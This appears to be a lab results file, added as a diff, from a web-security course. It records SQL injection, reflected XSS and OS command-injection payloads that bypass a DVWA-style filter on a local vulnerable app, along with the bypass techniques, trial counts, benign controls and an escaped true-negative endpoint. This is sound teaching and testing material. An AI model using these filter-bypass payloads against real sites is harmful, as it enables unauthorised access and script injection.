@@ -1,0 +1,208 @@
+{
+  "target": "vuln-web (labs/vuln-web/app/vulnweb_app.py), in-process on 127.0.0.1",
+  "filter_level": "Medium (DVWA-style built-in filter, common/medium_filter.py), fired IN FRONT of every sink so each bypass had to defeat it",
+  "oracle_trials_each": 3,
+  "classes": {
+    "sqli": {
+      "owasp": "A03:2021 \u2013 Injection",
+      "sink": "POST /login (do_login) \u2014 string-formatted SQL",
+      "baseline_neutralised_by_filter": true,
+      "confirmed_bypasses": 3,
+      "example_bypass": "admin' OR '1'='1"
+    },
+    "xss": {
+      "owasp": "A03:2021 \u2013 Injection (Cross-Site Scripting)",
+      "sink": "GET /?name= (do_reflect) \u2014 unescaped into HTML",
+      "baseline_neutralised_by_filter": true,
+      "confirmed_bypasses": 3,
+      "example_bypass": "<ScRiPt>alert('XSS-7f3a')</ScRiPt>"
+    },
+    "cmdi": {
+      "owasp": "A03:2021 \u2013 Injection (OS Command Injection)",
+      "sink": "POST /ping (do_ping) \u2014 host concatenated into a command",
+      "baseline_neutralised_by_filter": true,
+      "confirmed_bypasses": 3,
+      "example_bypass": "127.0.0.1 | whoami"
+    }
+  },
+  "xss_true_negative_safe_confirmed": false,
+  "broken_access_control": "A01:2021 Broken Access Control is NOT reachable in vuln-web: the app has no sessions, roles, object ownership or authorization checks of any kind \u2014 there is no access-control logic to break. The SQLi auth-bypass lets an attacker read the admin row, but that is a confidentiality failure via Injection (A03), not a broken access-control decision (A01): the authentication bypass is a CONSEQUENCE of the injection, not evidence of a broken access-control layer. Demonstrating a real A01 finding would need an endpoint that CHECKS a role or owner and does it wrong; a single-file app with no such check cannot manufacture one. This matches duel-2-web/ground_truth.json's explicit 'not_present: broken-access-control' and the week-6 lesson that #1 needs app semantics, not a payload \u2014 the exact point Part C makes the LLM fail on.",
+  "rows": [
+    {
+      "class": "sqli",
+      "owasp": "A03:2021 \u2013 Injection",
+      "sink": "POST /login (do_login) \u2014 string-formatted SQL",
+      "payload": "admin' or '1'='1",
+      "role": "baseline",
+      "technique": "canonical tautology (lowercase) \u2014 blocklisted by Medium",
+      "confirmed": false,
+      "successes_trials": "0/3",
+      "evidence": "(no effect \u2014 filter neutralised it)"
+    },
+    {
+      "class": "sqli",
+      "owasp": "A03:2021 \u2013 Injection",
+      "sink": "POST /login (do_login) \u2014 string-formatted SQL",
+      "payload": "admin' OR '1'='1",
+      "role": "bypass",
+      "technique": "CASE: uppercase OR evades the case-sensitive blocklist",
+      "confirmed": true,
+      "successes_trials": "3/3",
+      "evidence": "canary 'FLAG-sqli-9f2c-admin-session' exfiltrated"
+    },
+    {
+      "class": "sqli",
+      "owasp": "A03:2021 \u2013 Injection",
+      "sink": "POST /login (do_login) \u2014 string-formatted SQL",
+      "payload": "admin'/**/Or/**/'1'='1",
+      "role": "bypass",
+      "technique": "COMMENT+CASE: /**/ splits tokens, mixed-case Or",
+      "confirmed": true,
+      "successes_trials": "3/3",
+      "evidence": "canary 'FLAG-sqli-9f2c-admin-session' exfiltrated"
+    },
+    {
+      "class": "sqli",
+      "owasp": "A03:2021 \u2013 Injection",
+      "sink": "POST /login (do_login) \u2014 string-formatted SQL",
+      "payload": "admin'/**/-- -",
+      "role": "bypass",
+      "technique": "COMMENT: inline comment terminates the pw check",
+      "confirmed": true,
+      "successes_trials": "3/3",
+      "evidence": "canary 'FLAG-sqli-9f2c-admin-session' exfiltrated"
+    },
+    {
+      "class": "sqli-benign-control",
+      "owasp": "A03:2021 \u2013 Injection",
+      "sink": "POST /login (do_login) \u2014 string-formatted SQL",
+      "payload": "alice",
+      "role": "benign",
+      "technique": "a real username, wrong password",
+      "confirmed": false,
+      "successes_trials": "0/3",
+      "evidence": "no effect (correct)"
+    },
+    {
+      "class": "xss",
+      "owasp": "A03:2021 \u2013 Injection (Cross-Site Scripting)",
+      "sink": "GET /?name= (do_reflect) \u2014 unescaped into HTML",
+      "payload": "<script>alert('XSS-7f3a')</script>",
+      "role": "baseline",
+      "technique": "canonical <script> (removed by str_replace)",
+      "confirmed": false,
+      "successes_trials": "0/3",
+      "evidence": "(no effect \u2014 filter neutralised it)"
+    },
+    {
+      "class": "xss",
+      "owasp": "A03:2021 \u2013 Injection (Cross-Site Scripting)",
+      "sink": "GET /?name= (do_reflect) \u2014 unescaped into HTML",
+      "payload": "<ScRiPt>alert('XSS-7f3a')</ScRiPt>",
+      "role": "bypass",
+      "technique": "CASE: mixed-case tag evades case-sensitive str_replace",
+      "confirmed": true,
+      "successes_trials": "3/3",
+      "evidence": "unescaped '<ScRiPt>' reflected into HTML"
+    },
+    {
+      "class": "xss",
+      "owasp": "A03:2021 \u2013 Injection (Cross-Site Scripting)",
+      "sink": "GET /?name= (do_reflect) \u2014 unescaped into HTML",
+      "payload": "<scr<script>ipt>alert('XSS-7f3a')</script>",
+      "role": "bypass",
+      "technique": "NESTED: single-pass removal reconstitutes <script>",
+      "confirmed": true,
+      "successes_trials": "3/3",
+      "evidence": "unescaped '<script>' reflected into HTML"
+    },
+    {
+      "class": "xss",
+      "owasp": "A03:2021 \u2013 Injection (Cross-Site Scripting)",
+      "sink": "GET /?name= (do_reflect) \u2014 unescaped into HTML",
+      "payload": "<svg onload=alert('XSS-7f3a')>",
+      "role": "bypass",
+      "technique": "ALT-VECTOR: event handler, no <script> token",
+      "confirmed": true,
+      "successes_trials": "3/3",
+      "evidence": "unescaped '<svg onload=' reflected into HTML"
+    },
+    {
+      "class": "xss-benign-control",
+      "owasp": "A03:2021 \u2013 Injection (Cross-Site Scripting)",
+      "sink": "GET /?name= (do_reflect) \u2014 unescaped into HTML",
+      "payload": "Keoma O'Brien",
+      "role": "benign",
+      "technique": "legit name with an apostrophe",
+      "confirmed": false,
+      "successes_trials": "0/3",
+      "evidence": "no effect (correct)"
+    },
+    {
+      "class": "cmdi",
+      "owasp": "A03:2021 \u2013 Injection (OS Command Injection)",
+      "sink": "POST /ping (do_ping) \u2014 host concatenated into a command",
+      "payload": "127.0.0.1; whoami",
+      "role": "baseline",
+      "technique": "canonical ';' separator (stripped by Medium)",
+      "confirmed": false,
+      "successes_trials": "0/3",
+      "evidence": "(no effect \u2014 filter neutralised it)"
+    },
+    {
+      "class": "cmdi",
+      "owasp": "A03:2021 \u2013 Injection (OS Command Injection)",
+      "sink": "POST /ping (do_ping) \u2014 host concatenated into a command",
+      "payload": "127.0.0.1 | whoami",
+      "role": "bypass",
+      "technique": "pipe '|' \u2014 not in the {; &&} strip set",
+      "confirmed": true,
+      "successes_trials": "3/3",
+      "evidence": "shell metacharacter reached the command context"
+    },
+    {
+      "class": "cmdi",
+      "owasp": "A03:2021 \u2013 Injection (OS Command Injection)",
+      "sink": "POST /ping (do_ping) \u2014 host concatenated into a command",
+      "payload": "127.0.0.1 & whoami",
+      "role": "bypass",
+      "technique": "single '&' \u2014 filter strips only '&&'",
+      "confirmed": true,
+      "successes_trials": "3/3",
+      "evidence": "shell metacharacter reached the command context"
+    },
+    {
+      "class": "cmdi",
+      "owasp": "A03:2021 \u2013 Injection (OS Command Injection)",
+      "sink": "POST /ping (do_ping) \u2014 host concatenated into a command",
+      "payload": "127.0.0.1 $(whoami)",
+      "role": "bypass",
+      "technique": "command substitution $( ) \u2014 survives entirely",
+      "confirmed": true,
+      "successes_trials": "3/3",
+      "evidence": "shell metacharacter reached the command context"
+    },
+    {
+      "class": "cmdi-benign-control",
+      "owasp": "A03:2021 \u2013 Injection (OS Command Injection)",
+      "sink": "POST /ping (do_ping) \u2014 host concatenated into a command",
+      "payload": "api.internal.example",
+      "role": "benign",
+      "technique": "a plain hostname, no metacharacters",
+      "confirmed": false,
+      "successes_trials": "0/3",
+      "evidence": "no effect (correct)"
+    },
+    {
+      "class": "xss-true-negative(/safe)",
+      "owasp": "A03:2021 \u2013 Injection",
+      "sink": "GET /safe (do_reflect_safe) \u2014 html.escape",
+      "payload": "<svg onload=alert('XSS-7f3a')>",
+      "role": "true-negative",
+      "technique": "same bypass, fixed endpoint",
+      "confirmed": false,
+      "successes_trials": "0/3",
+      "evidence": "escaped by html.escape (correct)"
+    }
+  ]
+}
